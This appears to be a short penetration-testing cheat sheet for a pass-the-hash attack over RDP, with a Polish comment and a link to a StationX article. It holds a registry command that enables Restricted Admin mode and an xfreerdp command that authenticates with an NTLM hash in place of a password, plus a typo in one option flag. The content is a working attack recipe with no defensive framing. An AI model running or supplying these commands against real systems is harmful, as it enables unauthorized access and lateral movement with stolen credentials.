```powershell
# https://www.stationx.net/pass-the-hash-attack/
# zmienia Restricted Acces jeśli jest włączony
$ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```bash
#kali
$ xfreerdp /v:<IP> /u:<user> /pth:5c4d59391f656d5958dab124ffeabc20 +clipboard /dynamic-resolutionz
```